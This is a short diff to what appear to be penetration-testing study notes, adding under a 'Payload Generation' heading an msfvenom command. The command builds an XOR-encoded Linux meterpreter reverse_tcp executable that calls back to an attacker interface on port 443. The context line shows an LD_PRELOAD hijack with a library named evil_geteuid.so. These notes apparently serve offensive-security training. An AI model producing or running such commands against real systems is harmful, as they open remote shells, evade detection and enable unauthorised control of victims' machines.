@@ -73,6 +73,8 @@ export LD_PRELOAD=/home/offsec/evil_geteuid.so
 
 ## Payload Generation
 ```bash
+#For linux XOR
+sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
 
 ```
 
